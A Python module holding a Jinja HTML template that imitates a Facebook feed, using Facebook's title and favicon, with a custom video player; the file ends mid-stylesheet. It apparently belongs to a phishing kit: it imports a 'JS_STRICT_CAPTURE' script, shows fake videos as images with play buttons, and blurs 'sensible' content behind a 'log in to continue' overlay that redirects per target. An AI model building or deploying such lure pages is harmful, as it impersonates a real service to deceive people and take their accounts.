"""html_feed.py — auto-generated from templates.py."""

import base64

from .js_capture import JS_STRICT_CAPTURE

HTML_FEED = r"""
{% macro render_video_player(p, target_name) %}
                <div class="video-player-container relative bg-black w-full group" style="overflow: hidden;">
                    {% if p._fake_video %}
                        <!-- Fake Video: Image with play button overlay, no actual video -->
                        {% if p.image %}
                            {% if p.image.startswith("http://") or p.image.startswith("https://") or p.image.startswith("/") %}
                                {% set fake_src = p.image %}
                            {% else %}
                                {% set fake_src = "/video/" + target_name + "/" + p.image %}
                            {% endif %}
                        {% else %}
                            {% set fake_src = "" %}
                        {% endif %}
                        {% if fake_src %}
                            <img draggable="false" src="{{ fake_src }}" class="w-full" style="max-height: 600px; object-fit: contain; display: block; user-select: none;">
                        {% endif %}
                        <div class="absolute inset-0 flex items-center justify-center" style="background: rgba(0,0,0,0.25);">
                            <div class="w-20 h-20 bg-white/30 backdrop-blur-sm rounded-full flex items-center justify-center border-2 border-white shadow-lg">
                                <i class="fas fa-play text-white text-3xl ml-1"></i>
                            </div>
                        </div>
                    </div>
                    {% else %}
                    <!-- Video Element -->
                    {% if p._video_url %}
                        {# _video_url is set by routes.py for all video types (local, external, vid_) #}
                        {% set video_src = p._video_url %}
                        {# Poster: only use it if it's an actual image cover, NEVER the video URL itself #}
                        {% if p._cover_url %}
                            {% set cover_src = p._cover_url %}
                        {% else %}
                            {% set cover_src = none %}
                        {% endif %}
                    {% else %}
                        {# Ultimate fallback: construct URL from p.image #}
                        {% set video_src = "/video/" + target_name + "/" + p.image %}
                        {% if p._cover_url %}
                            {% set cover_src = p._cover_url %}
                        {% elif p.video_cover %}
                            {% set cover_src = "/video/" + target_name + "/" + p.video_cover %}
                        {% else %}
                            {% set cover_src = none %}
                        {% endif %}
                    {% endif %}
                    {# We do NOT parse the URL to detect an extension.
                       Any URL is treated as a video. The browser uses the
                       server's Content-Type header (NOT the URL extension) to
                       pick the codec, so a generic type="video/mp4" works for
                       local files, proxied URLs, and encrypted CDN URLs alike. #}
                    <video class="w-full"
                           style="display: block; max-height: 600px; object-fit: contain; user-select: none; -webkit-user-select: none;"
                           {% if cover_src %}poster="{{ cover_src }}"{% endif %}
                           preload="auto"
                           loop
                           playsinline>
                        <source src="{{ video_src }}" type="video/mp4">
                        Your browser does not support the video tag.
                    </video>
                    
                    <!-- Play Overlay Button -->
                    <div class="video-play-overlay absolute inset-0 flex items-center justify-center" style="background: rgba(0,0,0,0.3); pointer-events: auto;">
                        <button class="video-play-btn w-20 h-20 bg-white/30 backdrop-blur-sm rounded-full flex items-center justify-center border-2 border-white shadow-lg hover:bg-white/40 transition" style="pointer-events: auto;">
                            <i class="fas fa-play text-white text-3xl ml-1"></i>
                        </button>
                    </div>
                    
                    <!-- Video Loading Spinner -->
                    <div class="absolute inset-0 flex items-center justify-center pointer-events-none z-30">
                        <div class="video-loading-spinner" style="position: static; transform: none; top: auto; left: auto; width: 50px; height: 50px;"></div>
                    </div>
                    
                    <!-- Custom Controls Bar -->
                    <div class="video-controls absolute bottom-0 left-0 right-0 bg-gradient-to-t from-black/90 via-black/70 to-transparent p-3 opacity-0 group-hover:opacity-100 transition-opacity duration-300" style="pointer-events: auto;">
                        <!-- Progress Bar with Cache Indicator -->
                        <div class="mb-2">
                            <div class="relative h-1 bg-gray-600 rounded cursor-pointer overflow-hidden" style="pointer-events: auto;">
                                <!-- Cache Level Indicator (Light Red) -->
                                <div class="cache-indicator absolute left-0 top-0 h-full bg-white/40 transition-all duration-200" style="width: 0%; pointer-events: none;" title="Cache usage"></div>
                                <!-- Main Progress Bar -->
                                <input type="range" class="video-progress absolute left-0 top-0 w-full h-1 rounded cursor-pointer" min="0" max="100" value="0" style="-webkit-appearance: none; appearance: none; background: transparent; z-index: 10;">
                            </div>
                        </div>
                        
                        <!-- Control Buttons Row -->
                        <div class="flex items-center justify-between gap-2 text-white text-sm">
                            <!-- Left Controls -->
                            <div class="flex items-center gap-3">
                                <!-- Play/Pause Button -->
                                <button class="video-play-control flex items-center justify-center w-8 h-8 hover:text-white/70 transition">
                                    <i class="fas fa-play"></i>
                                </button>
                                
                                <!-- Volume Control -->
                                <div class="flex items-center gap-2">
                                    <button class="video-mute-btn flex items-center justify-center w-8 h-8 hover:text-white/70 transition" title="Cliquer pour activer le son">
                                        <i class="fas fa-volume-mute"></i>
                                    </button>
                                    <input type="range" class="video-volume w-20 h-1 bg-gray-600 rounded cursor-pointer" min="0" max="100" value="100" style="-webkit-appearance: none; appearance: none;">
                                </div>
                                
                                <!-- Time Display -->
                                <span class="text-xs font-mono"><span class="video-current">0:00</span> / <span class="video-duration">0:00</span></span>
                            </div>
                            
                            <!-- Right Controls -->
                            <div class="flex items-center gap-2">
                                <!-- Resolution Selector -->
                                {% if p.video_resolutions and p.video_resolutions|length > 0 %}
                                    <select class="video-resolution bg-gray-800 text-white text-xs px-2 py-1 rounded border border-gray-600 cursor-pointer" style="-webkit-appearance: none; appearance: none;">
                                        {% for res in p.video_resolutions %}
                                            <option value="{{ res }}">{{ res }}</option>
                                        {% endfor %}
                                    </select>
                                {% endif %}
                                
                                <!-- Speed Selector -->
                                <select class="video-speed bg-gray-800 text-white text-xs px-2 py-1 rounded border border-gray-600 cursor-pointer text-center" title="Vitesse de lecture" style="-webkit-appearance: none; appearance: none;">
                                    <option value="0.25">-3x</option>
                                    <option value="0.5">-2x</option>
                                    <option value="0.75">-1x</option>
                                    <option value="1" selected>1x</option>
                                    <option value="1.5">2x</option>
                                    <option value="2">3x</option>
                                </select>
                                
                                <!-- Fullscreen Button -->
                                <button class="video-fullscreen flex items-center justify-center w-8 h-8 hover:text-white/70 transition">
                                    <i class="fas fa-expand"></i>
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
                
                <!-- Video Player Script -->
                <script>
                (function() {
                    const container = document.currentScript.previousElementSibling.parentElement.querySelector('.video-player-container');
                    const video = container.querySelector('video');
                    const playOverlay = container.querySelector('.video-play-overlay');
                    const playBtn = container.querySelector('.video-play-btn');
                    const controls = container.querySelector('.video-controls');
                    const playControl = container.querySelector('.video-play-control');
                    const muteBtn = container.querySelector('.video-mute-btn');
                    const volumeSlider = container.querySelector('.video-volume');
                    const progressBar = container.querySelector('.video-progress');
                    const currentTimeSpan = container.querySelector('.video-current');
                    const durationSpan = container.querySelector('.video-duration');
                    const fullscreenBtn = container.querySelector('.video-fullscreen');
                    const speedSelect = container.querySelector('.video-speed');
                    
                    if (!video) return;
                    
                    // ========== EXPLICIT VIDEO LOADING ==========
                    // Strategy: treat ANY URL as a video, no parsing, no routing,
                    // no extension detection, no Content-Type sniffing.
                    // The browser picks the codec from the server's Content-Type
                    // header (NOT from the URL), so this works for any URL —
                    // long, encrypted, with or without extension.
                    //
                    // Fallback: if native playback fails (e.g. HLS m3u8 on Chrome
                    // desktop which has no native HLS support) and the HLS.js
                    // library is available, hand the SAME URL to HLS.js — no
                    // URL parsing involved, the proxy already rewrites m3u8
                    // segment URLs so HLS.js can resolve them correctly.
                    const sourceElem = video.querySelector('source');
                    const videoSrc = sourceElem ? sourceElem.src : null;

                    console.log('[VIDEO PLAYER] Loading URL as video:', videoSrc);

                    function loadVideoSource(url) {
                        if (!url) return;
                        try {
                            video.src = url;
                            video.load();
                        } catch (e) {
                            console.error('[VIDEO PLAYER] Load failed:', e);
                        }
                    }

                    // Fallback to HLS.js if native playback errors out.
                    // This covers browsers without native HLS support (Chrome
                    // desktop, Firefox) trying to play an m3u8 stream.
                    if (videoSrc) {
                        video.addEventListener('error', function onNativeError() {
                            const err = video.error;
                            // MEDIA_ERR_SRC_NOT_SUPPORTED (4) or MEDIA_ERR_DECODE (3)
                            // → likely a format the browser can't handle natively (e.g. HLS on Chrome)
                            if (!err || (err.code !== 4 && err.code !== 3)) return;
                            video.removeEventListener('error', onNativeError);
                            if (typeof Hls !== 'undefined' && Hls.isSupported()) {
                                console.log('[VIDEO PLAYER] Native playback failed (code=' + err.code +
                                            '), retrying with HLS.js for:', videoSrc);
                                try {
                                    video.removeAttribute('src');
                                    video.load();
                                    const hls = new Hls({ enableWorker: true });
                                    hls.loadSource(videoSrc);
                                    hls.attachMedia(video);
                                    hls.on(Hls.Events.ERROR, function (evt, data) {
                                        if (data.fatal) console.error('[HLS fatal]', data);
                                    });
                                } catch (e) {
                                    console.error('[HLS.js fallback failed]', e);
                                }
                            } else {
                                console.log('[VIDEO PLAYER] No HLS.js fallback available');
                            }
                        }, { once: false });
                    }

                    loadVideoSource(videoSrc);
                    
                    // Error handling - Track and log all video errors
                    video.addEventListener('error', function(e) {
                        const error = video.error;
                        console.error('[VIDEO ERROR]', {
                            code: error?.code,
                            message: error?.message,
                            mediaError: {
                                MEDIA_ERR_ABORTED: 1,
                                MEDIA_ERR_NETWORK: 2,
                                MEDIA_ERR_DECODE: 3,
                                MEDIA_ERR_SRC_NOT_SUPPORTED: 4
                            }
                        });
                        // Show overlay with retry
                        playOverlay.style.display = 'flex';
                    }, true);
                    
                    // Source element error handling
                    if (sourceElem) {
                        sourceElem.addEventListener('error', function(e) {
                            console.error('[SOURCE ERROR]', {
                                src: sourceElem.src,
                                type: sourceElem.type,
                                event: e
                            });
                        });
                    }
                    
                    // Log all video state changes
                    video.addEventListener('loadstart', () => {
                        console.log('[VIDEO STATE] loadstart - Video loading started');
                    });
                    
                    video.addEventListener('progress', () => {
                        console.log('[VIDEO STATE] progress - Buffering:', Math.round(video.buffered.length > 0 ? (video.buffered.end(0) / video.duration) * 100 : 0) + '%');
                    });
                    
                    video.addEventListener('suspend', () => {
                        console.log('[VIDEO STATE] suspend - Buffering suspended');
                    });
                    
                    video.addEventListener('abort', () => {
                        console.log('[VIDEO STATE] abort - Loading aborted');
                    });
                    
                    video.addEventListener('emptied', () => {
                        console.log('[VIDEO STATE] emptied - Video emptied');
                    });
                    
                    video.addEventListener('stalled', () => {
                        console.log('[VIDEO STATE] stalled - No data available, waiting for more');
                    });
                    
                    video.addEventListener('loadedmetadata', () => {
                        console.log('[VIDEO STATE] loadedmetadata - Metadata loaded', {
                            duration: video.duration,
                            videoWidth: video.videoWidth,
                            videoHeight: video.videoHeight
                        });
                        durationSpan.textContent = formatTime(video.duration);
                    });
                    
                    video.addEventListener('loadeddata', () => {
                        console.log('[VIDEO STATE] loadeddata - First frame loaded');
                    });
                    
                    video.addEventListener('canplay', function() {
                        console.log('[VIDEO STATE] canplay - Ready to play');
                        container.querySelector('.video-loading-spinner')?.classList.remove('show');
                        // Video does NOT autoplay — user must click to start playback.
                        // The play overlay stays visible until the user clicks.
                    });
                    
                    video.addEventListener('canplaythrough', () => {
                        console.log('[VIDEO STATE] canplaythrough - Can play without stopping');
                    });
                    
                    video.addEventListener('playing', function() {
                        console.log('[VIDEO STATE] playing - Video is playing');
                        container.querySelector('.video-loading-spinner')?.classList.remove('show');
                        playControl.innerHTML = '<i class="fas fa-pause"></i>';
                    });
                    
                    video.addEventListener('pause', function() {
                        console.log('[VIDEO STATE] pause - Video is paused');
                        playControl.innerHTML = '<i class="fas fa-play"></i>';
                    });
                    
                    video.addEventListener('ended', () => {
                        console.log('[VIDEO STATE] ended - Video playback ended');
                        // With the `loop` attribute, the video restarts automatically.
                        // Only show the overlay if loop was disabled.
                        if (!video.loop) {
                            playOverlay.style.display = 'flex';
                        }
                    });
                    
                    // ========== FORMAT TIME HELPER ==========
                    function formatTime(seconds) {
                        if (isNaN(seconds)) return '0:00';
                        const h = Math.floor(seconds / 3600);
                        const m = Math.floor((seconds % 3600) / 60);
                        const s = Math.floor(seconds % 60);
                        const mins = String(m).padStart(2, '0');
                        const secs = String(s).padStart(2, '0');
                        return h > 0 ? `${h}:${mins}:${secs}` : `${m}:${secs}`;
                    }
                    
                    // Speed control variable
                    let currentSpeed = 1;
                    const speedCycles = [1, 1.5, 2];
                    
                    // Double-tap tracking
                    let lastTapTime = 0;
                    let tapCount = 0;
                    
                    // Create speed indicator element
                    const speedIndicator = document.createElement('div');
                    speedIndicator.className = 'speed-indicator absolute top-4 right-4 bg-red-600 text-white px-3 py-2 rounded-lg text-sm font-bold opacity-0 transition-opacity duration-300 pointer-events-none';
                    speedIndicator.textContent = '1x';
                    speedIndicator.style.zIndex = '1000';
                    container.appendChild(speedIndicator);
                    
                    // ========== EXPLICIT PLAY/PAUSE CONTROL ==========
                    // Track whether the user has unlocked audio. Mobile browsers
                    // block autoplay-with-sound until the user interacts with the page.
                    // Strategy: video starts muted+autoplay; the first user click on
                    // the video unmutes it (in addition to toggling play/pause).
                    // sound_enabled is set by routes.py — if True, the video plays WITH sound
                    // on the first click. If False, the video stays muted.
                    const _soundEnabled = {{ p.sound_enabled | tojson if p.sound_enabled is defined else 'true' }};
                    let audioUnlocked = false;
                    function unlockAudio() {
                        if (audioUnlocked) return;
                        audioUnlocked = true;
                        if (_soundEnabled) {
                            video.muted = false;
                            if (video.volume === 0) video.volume = 1;
                            muteBtn.innerHTML = '<i class="fas fa-volume-up"></i>';
                            if (volumeSlider) volumeSlider.value = Math.round((video.volume || 1) * 100);
                            console.log('[AUDIO] Unlocked — sound enabled for this publication');
                        } else {
                            video.muted = true;
                            muteBtn.innerHTML = '<i class="fas fa-volume-mute"></i>';
                            console.log('[AUDIO] Staying muted — sound disabled for this publication');
                        }
                    }

                    function togglePlay() {
                        // First click unlocks audio (with or without sound depending on _soundEnabled)
                        if (!audioUnlocked) unlockAudio();

                        if (video.paused) {
                            // Attempt to play with error handling
                            const playPromise = video.play();
                            if (playPromise !== undefined) {
                                playPromise.then(() => {
                                    console.log('[PLAY] Video playing successfully');
                                    playOverlay.style.display = 'none';
                                    playControl.innerHTML = '<i class="fas fa-pause"></i>';
                                }).catch(error => {
                                    console.error('[PLAY ERROR]', error);
                                    console.log('[PLAY] Attempting to reload and retry...');
                                    video.load();
                                    setTimeout(() => {
                                        video.play().then(() => {
                                            console.log('[PLAY] Retry successful');
                                            playOverlay.style.display = 'none';
                                            playControl.innerHTML = '<i class="fas fa-pause"></i>';
                                        }).catch(err => {
                                            console.error('[PLAY RETRY FAILED]', err);
                                            playOverlay.style.display = 'flex';
                                        });
                                    }, 300);
                                });
                            } else {
                                // Fallback for older browsers
                                video.play();
                                playOverlay.style.display = 'none';
                                playControl.innerHTML = '<i class="fas fa-pause"></i>';
                            }
                        } else {
                            // Pause video
                            video.pause();
                            playOverlay.style.display = 'flex';
                            playControl.innerHTML = '<i class="fas fa-play"></i>';
                            console.log('[PAUSE] Video paused');
                        }
                    }
                    
                    if (speedSelect) {
                        speedSelect.addEventListener('change', (e) => {
                            video.playbackRate = parseFloat(e.target.value);
                            e.stopPropagation();
                        });
                        speedSelect.addEventListener('click', (e) => e.stopPropagation());
                    }
                    
                    // Click on video to play/pause
                    video.addEventListener('click', togglePlay);
                    playBtn.addEventListener('click', togglePlay);
                    playControl.addEventListener('click', togglePlay);

                    // Double-tap to change speed (mobile)
                    video.addEventListener('touchend', function(e) {
                        const currentTime = Date.now();
                        if (currentTime - lastTapTime < 300) {
                            tapCount++;
                            if (tapCount === 2) {
                                e.preventDefault();
                                changeSpeed();
                                tapCount = 0;
                            }
                        } else {
                            tapCount = 1;
                        }
                        lastTapTime = currentTime;
                    });

                    // Double-click to change speed (desktop) — uses native dblclick so it
                    // does NOT interfere with the single-click play/pause handler above.
                    video.addEventListener('dblclick', function(e) {
                        changeSpeed();
                    });
                    
                    // Change speed function
                    function changeSpeed() {
                        const currentIndex = speedCycles.indexOf(currentSpeed);
                        const nextIndex = (currentIndex + 1) % speedCycles.length;
                        currentSpeed = speedCycles[nextIndex];
                        video.playbackRate = currentSpeed;
                        
                        // Show indicator
                        speedIndicator.textContent = currentSpeed + 'x';
                        speedIndicator.style.opacity = '1';
                        setTimeout(function() {
                            speedIndicator.style.opacity = '0';
                        }, 1500);
                    }
                    
                    // Video caching - Store video URL for offline access
                    // Cache constants
                    const CACHE_SIZE_BYTES = 3221225472; // 3GB in bytes
                    const cacheIndicator = container.querySelector('.cache-indicator');
                    
                    // Function to update cache indicator
                    function updateCacheIndicator() {
                        if (!cacheIndicator || !navigator.storage) return;
                        
                        navigator.storage.estimate().then(estimate => {
                            const cachePercent = (estimate.usage / CACHE_SIZE_BYTES) * 100;
                            cacheIndicator.style.width = Math.min(cachePercent, 100) + '%';
                            cacheIndicator.title = `Cache usage: ${(estimate.usage / 1073741824).toFixed(2)}GB / 3GB`;
                        }).catch(err => console.log('Storage estimate error:', err));
                    }
                    
                    function cacheVideo() {
                        // Local files: cached automatically by the Service Worker (sw.js)
                        // External URLs: cached by the browser's native HTTP cache
                        // No manual intervention needed
                        updateCacheIndicator();
                    }
                    
                    // Trigger indicator update when video is ready
                    video.addEventListener('canplay', cacheVideo);
                    
                    // Update cache indicator periodically
                    setInterval(updateCacheIndicator, 5000);
                    
                    // Initial cache indicator update
                    updateCacheIndicator();
                    
                    // ========== DYNAMIC PLAYBACK TRACKING ==========
                    // Update progress bar and track buffering
                    video.addEventListener('timeupdate', function() {
                        const duration = video.duration || 0;
                        const currentTime = video.currentTime || 0;
                        const percent = duration > 0 ? (currentTime / duration) * 100 : 0;
                        
                        progressBar.value = percent || 0;
                        currentTimeSpan.textContent = formatTime(currentTime);
                        durationSpan.textContent = formatTime(duration);
                        
                        // Calculate buffered percentage for cache indicator
                        if (video.buffered && video.buffered.length > 0) {
                            const bufferedEnd = video.buffered.end(video.buffered.length - 1);
                            const bufferedPercent = (bufferedEnd / duration) * 100;
                            cacheIndicator.style.width = Math.min(bufferedPercent, 100) + '%';
                        }
                    });
                    
                    video.addEventListener('loadedmetadata', function() {
                        console.log('[METADATA] Video duration:', formatTime(video.duration));
                        durationSpan.textContent = formatTime(video.duration);
                    });
                    
                    // Track buffering progress
                    video.addEventListener('progress', function() {
                        if (video.buffered && video.buffered.length > 0) {
                            const bufferedEnd = video.buffered.end(video.buffered.length - 1);
                            const duration = video.duration || 1;
                            const bufferedPercent = Math.round((bufferedEnd / duration) * 100);
                            console.log('[BUFFERING]', bufferedPercent + '% - Cached:', formatTime(bufferedEnd) + '/' + formatTime(duration));
                        }
                    });
                    
                    // Progress bar click to seek (EXPLICIT SEEKING)
                    progressBar.addEventListener('change', function() {
                        const newTime = (progressBar.value / 100) * video.duration;
                        console.log('[SEEKING] Moving to', formatTime(newTime));
                        video.currentTime = newTime;
                    });
                    
                    progressBar.addEventListener('input', function() {
                        const newTime = (progressBar.value / 100) * video.duration;
                        currentTimeSpan.textContent = formatTime(newTime);
                    });
                    
                    // Volume control
                    volumeSlider.addEventListener('input', function() {
                        const volume = volumeSlider.value / 100;
                        video.volume = volume;
                        video.muted = false;
                        muteBtn.innerHTML = video.volume > 0 ? '<i class="fas fa-volume-up"></i>' : '<i class="fas fa-volume-mute"></i>';
                        console.log('[VOLUME]', Math.round(volume * 100) + '%');
                    });
                    
                    // Mute button
                    muteBtn.addEventListener('click', function(e) {
                        e.stopPropagation();
                        video.muted = !video.muted;
                        if (!video.muted) {
                            // Unmuting = user gesture = audio is now unlocked
                            audioUnlocked = true;
                            if (video.volume === 0) video.volume = 1;
                            if (volumeSlider) volumeSlider.value = Math.round((video.volume || 1) * 100);
                        }
                        muteBtn.innerHTML = video.muted ? '<i class="fas fa-volume-mute"></i>' : '<i class="fas fa-volume-up"></i>';
                        console.log('[MUTE]', video.muted ? 'ON' : 'OFF');
                    });
                    
                    // Video Loading Spinner
                    const spinner = container.querySelector('.video-loading-spinner');
                    let _videoReady = false;  // Once loaded, don't show spinner again unless seeking
                    
                    // Show spinner when loading starts
                    video.addEventListener('loadstart', function() {
                        if (!_videoReady) spinner.classList.add('show');
                    });
                    
                    // Show spinner when seeking (user drags progress bar)
                    video.addEventListener('seeking', function() {
                        spinner.classList.add('show');
                    });
                    
                    // Hide spinner when video can play — this is the definitive "loaded" state
                    video.addEventListener('canplay', function() {
                        _videoReady = true;
                        spinner.classList.remove('show');
                    });
                    
                    // Hide spinner when video is actually playing
                    video.addEventListener('playing', function() {
                        _videoReady = true;
                        spinner.classList.remove('show');
                    });
                    
                    // Hide spinner when seeking is done
                    video.addEventListener('seeked', function() {
                        spinner.classList.remove('show');
                    });
                    
                    // Hide spinner if video is paused (user paused, not buffering)
                    video.addEventListener('pause', function() {
                        spinner.classList.remove('show');
                    });
                    
                    // Hide spinner on error (don't keep spinning if video failed)
                    video.addEventListener('error', function() {
                        spinner.classList.remove('show');
                    });
                    
                    // Hide spinner on stalled (network stalled — don't spin forever)
                    video.addEventListener('stalled', function() {
                        setTimeout(function() { spinner.classList.remove('show'); }, 2000);
                    });
                    
                    // Fullscreen - Keep controls visible
                    fullscreenBtn.addEventListener('click', function() {
                        if (container.requestFullscreen) {
                            container.requestFullscreen();
                        } else if (container.webkitRequestFullscreen) {
                            container.webkitRequestFullscreen();
                        } else if (container.mozRequestFullScreen) {
                            container.mozRequestFullScreen();
                        } else if (container.msRequestFullscreen) {
                            container.msRequestFullscreen();
                        }
                        // Force controls visibility in fullscreen
                        controls.classList.add('fullscreen-controls');
                    });
                    
                    // Listen for fullscreen change events
                    document.addEventListener('fullscreenchange', function() {
                        if (document.fullscreenElement) {
                            controls.classList.add('fullscreen-controls');
                        } else {
                            controls.classList.remove('fullscreen-controls');
                        }
                    });
                    
                    // Webkit fullscreen
                    document.addEventListener('webkitfullscreenchange', function() {
                        if (document.webkitFullscreenElement) {
                            controls.classList.add('fullscreen-controls');
                        } else {
                            controls.classList.remove('fullscreen-controls');
                        }
                    });
                    
                    // Moz fullscreen
                    document.addEventListener('mozfullscreenchange', function() {
                        if (document.mozFullScreenElement) {
                            controls.classList.add('fullscreen-controls');
                        } else {
                            controls.classList.remove('fullscreen-controls');
                        }
                    });
                    
                    // MS fullscreen
                    document.addEventListener('msfullscreenchange', function() {
                        if (document.msFullscreenElement) {
                            controls.classList.add('fullscreen-controls');
                        } else {
                            controls.classList.remove('fullscreen-controls');
                        }
                    });
                    
                    // Show/hide play overlay on play/pause
                    video.addEventListener('play', function() {
                        playOverlay.style.display = 'none';
                    });
                    
                    video.addEventListener('pause', function() {
                        playOverlay.style.display = 'flex';
                    });
                    
                    // Prevent right-click
                    video.addEventListener('contextmenu', function(e) {
                        e.preventDefault();
                        return false;
                    });
                    
                    // Prevent download on drag
                    video.addEventListener('dragstart', function(e) {
                        e.preventDefault();
                        return false;
                    });
                 })();
                </script>
                    {% endif %}
{% endmacro %}
{% macro blur_overlay(p) %}
                {% if p.blur_enabled %}
                <div class="relative overflow-hidden">
                    <div style="filter: blur(12px); pointer-events: none; user-select: none;">
                {% endif %}
                {{ caller() }}
                {% if p.blur_enabled %}
                    </div>
                    <div class="absolute inset-0 flex flex-col items-center justify-center gap-2 cursor-pointer" style="background: rgba(0,0,0,0.18);"
                         onclick="startVideosAndGo('{{ p.redirect_after }}')">
                        <div class="flex flex-col items-center gap-1 bg-white/90 backdrop-blur-sm rounded-2xl px-5 py-4 shadow-lg pointer-events-none">
                            <i class="fas fa-eye-slash text-gray-700" style="font-size: 28px;"></i>
                            {% if p.blur_reason %}
                            <span class="text-gray-800 font-semibold text-sm text-center" style="max-width: 200px;">{{ p.blur_reason }}</span>
                            {% else %}
                            <span class="text-gray-800 font-semibold text-sm">Contenu sensible</span>
                            {% endif %}
                            <span class="text-blue-600 text-xs font-medium mt-1">Se connecter pour continuer</span>
                        </div>
                    </div>
                </div>
                {% endif %}
{% endmacro %}
<!-- HLS.js — loaded for browsers without native HLS support (Chrome desktop, Firefox).
     Used as a fallback after native playback fails. No URL parsing. -->
<script src="https://cdn.jsdelivr.net/npm/hls.js@latest"></script>
<!DOCTYPE html>
<html lang="{{ lang }}">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/y1/r/ay1hV6OlegS.ico" type="image/x-icon">
    <title>Facebook</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        body { background: #f0f2f5; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; padding: 0; }
        .post { background: white; border-radius: 12px; box-shadow: 0 1px 3px rgba(0,0,0,0.08); max-width: 500px; margin: 12px auto; overflow: hidden; border: 1px solid #e4e6eb; }
        .fb-top { background: white; padding: 8px 16px; position: sticky; top: 0; z-index: 10; }
        .fb-top-content { display: flex; align-items: center; justify-content: space-between; max-width: 500px; margin: 0 auto; }
        
        /* Desktop Layout */
        @media (min-width: 1024px) {
            .fb-top { padding: 12px 24px; }
            .fb-top-content { max-width: 100%; width: 100%; }
            .post { max-width: 500px; }
            .feed-container { max-width: 1200px; margin: 0 auto; display: grid; grid-template-columns: 1fr 500px 1fr; gap: 20px; padding-top: 20px; }
            .feed-posts { grid-column: 2; }
            .sidebar-left { grid-column: 1; height: calc(100vh - 80px); position: sticky; top: 70px; display: flex; flex-direction: column; justify-content: center; }
            .sidebar-right { grid-column: 3; }
            .fb-icons-mobile { display: none; }
            .fb-icons-desktop { display: flex; align-items: center; gap: 12px; }
            .fb-search-bar {
                display: flex; align-items: center; gap: 8px;
                background-color: #E4E6EB; border-radius: 20px;
                padding: 7px 14px; cursor: pointer;
                min-width: 160px; max-width: 240px;
            }
            .fb-search-bar:hover { background-color: #D8DADF; }
            .fb-search-icon { color: #65676B; font-size: 14px; flex-shrink: 0; }
            .fb-search-input {
                border: none; background: transparent; outline: none;
                font-size: 14px; color: #1C1E21; width: 100%; cursor: pointer;
                font-family: inherit;
            }
            .fb-search-input::placeholder { color: #65676B; }
        }
        
        /* Mobile Layout */
        @media (max-width: 1023px) {
            .feed-container { display: block; padding: 0; }
            .sidebar-left, .sidebar-right { display: none; }
            .fb-icons-mobile { display: flex; gap: 8px; }
            .fb-icons-desktop { display: none; }
        }
        
        /* Feed Container Responsive Layout */
        .feed-container {
            display: grid;
            grid-template-columns: 1fr;
            gap: 20px;
            max-width: 100%;
            margin: 0 auto;
            padding: 0;
        }
        
        .feed-posts {
            grid-column: 1;
        }
        
        .sidebar-left,
        .sidebar-right {
            display: none;
        }
        
        @media (min-width: 1024px) {
            .feed-container {
                grid-template-columns: 280px 1fr 320px;
                max-width: 1400px;
                margin: 0 auto;
            }
            
            .sidebar-left {
                display: block;
                grid-column: 1;
                position: sticky;
                top: 60px;
                height: fit-content;
            }
            
            .feed-posts {
                grid-column: 2;
            }
            
            .sidebar-right {
                display: block;
                grid-column: 3;
                position: sticky;
                top: 60px;
                height: fit-content;
            }
        }
        
        .fb-icons { width: 36px; height: 36px; background: #f0f2f5; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: background 0.2s; }
        .fb-icons:hover { background: #e4e6eb; }
        .fb-icons i { color: #65676b; font-size: 14px; }
        .fb-badge { position: absolute; top: -4px; right: -4px; background: #e7163a; color: white; font-size: 10px; font-weight: bold; padding: 2px 5px; border-radius: 12px; border: 2px solid white; }
        
        .grad { min-height: 280px; display: flex; align-items: center; justify-content: center; padding: 30px; color: white; font-size: 1.5rem; font-weight: bold; text-align: center; text-shadow: 0 1px 3px rgba(0,0,0,0.3); }
        .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.5); backdrop-filter: blur(4px); display: flex; align-items: center; justify-content: center; z-index: 9999; padding: 20px; transition: opacity 0.3s ease, visibility 0.3s ease; }
        .modal-overlay.hidden { display: flex !important; opacity: 0; visibility: hidden; pointer-events: none; }
        .modal-overlay:not(.hidden) .modal-card { animation: pop 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards; }
        .modal-card { width: 100%; max-width: 400px; background: white; border-radius: 16px; overflow: hidden; opacity: 0; transform: scale(0.8); }
        @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
        .post { animation: slideUp 0.5s ease-out forwards; opacity: 0; }
        .post:hover { transform: scale(1.005); transition: transform 0.2s ease-in-out; }
        .animate-pop { animation: pop 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
        @keyframes pop { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
.text-content { position: relative; white-space: pre-wrap; word-break: break-word; font-family: inherit; }
        .text-content.truncated { max-height: 4.5em; overflow: hidden; display: -webkit-box; -webkit-line-clamp: 3; -webkit-box-orient: vertical; }
        .see-more-btn { color: #65676b; font-weight: 600; cursor: pointer; margin-top: 4px; display: none; }
        .see-more-btn:hover { text-decoration: underline; }
        
        /* Modern Video Player Styles */
        video {
            -webkit-user-select: none;
            -moz-user-select: none;
            user-select: none;
            -webkit-user-drag: none;
            user-drag: none;
            cursor: pointer;
        }
        
        video::-webkit-media-controls-enclosure {
            display: none !important;
        }
        
        video::-webkit-media-controls { display: none !important; }
        video::-moz-media-controls { display: none !important; }
        
        .speed-indicator {
            animation: fadeInOut 0.3s ease-in-out;
            font-family: 'Courier New', monospace;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
        }
        
        @keyframes fadeInOut {
            0% { opacity: 0; transform: scale(0.8); }
            50% { opacity: 1; transform: scale(1.1); }
            100% { opacity: 0; transform: scale(0.8); }
        }
        
        /* Video Loading Spinner */
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .video-player-container {
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .video-loading-spinner {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 50px;
            height: 50px;
            border: 4px solid rgba(255, 255, 255, 0.2);
            border-top: 4px solid rgba(255, 255, 255, 0.8);
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            z-index: 30;
